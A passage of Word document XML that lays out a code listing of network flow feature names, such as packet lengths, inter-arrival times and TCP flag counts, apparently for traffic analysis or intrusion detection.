      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Packet Length Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C272E8C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Packet Length Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F434346">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Packet Length Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3E5474F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Packet Length Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="647B7594">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow Bytes/s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63C19338">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow Packets/s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7090BA12">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow IAT Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="60693F79">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow IAT Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C16AE4C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow IAT Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="672CDEBD">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Flow IAT Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="71009290">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd IAT Total",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="32682AEE">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd IAT Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4BB0E040">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd IAT Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="725A811D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd IAT Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7A7296EB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd IAT Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C4104C2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd IAT Total",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07D87A40">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd IAT Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="559879BB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd IAT Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C1548E9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd IAT Max",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51E8F03F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd IAT Min",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E32D87C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd PSH Flags",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C0E6014">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd PSH Flags",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6A4D9B32">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd URG Flags",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="59A50E61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd URG Flags",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="06DBDA70">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Header Length",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="461A5E91">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Header Length",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="356D3D3F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Packets/s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0C3A9EA2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Packets/s",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3479099E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Min Packet Length",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="35B8EE1B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Max Packet Length",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="79650282">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Packet Length Mean",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="103E374A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Packet Length Std",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="009799F7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Packet Length Variance",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7F248001">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "FIN Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DCF218B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "SYN Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46A32BCC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "RST Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="450521F3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "PSH Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="078033FA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ACK Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5396E479">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "URG Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="754A9C34">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "CWE Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="74A22E61">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "ECE Flag Count",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="23AC1A11">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Down/Up Ratio",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2978A71C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Average Packet Size",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6179DD0C">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Avg Fwd Segment Size",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3420C2C3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Avg Bwd Segment Size",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E79230D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Header Length.1",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0F5870D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Avg Bytes/Bulk",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07712EE4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Avg Packets/Bulk",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B78B1F9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Fwd Avg Bulk Rate",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18E3DE01">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Avg Bytes/Bulk",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08D2F206">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Avg Packets/Bulk",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6EA41C85">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Bwd Avg Bulk Rate",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="179ABA8F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Subflow Fwd Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3F939B05">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Subflow Fwd Bytes",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B7F478D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    "Subflow Bwd Packets",</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B463B90">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
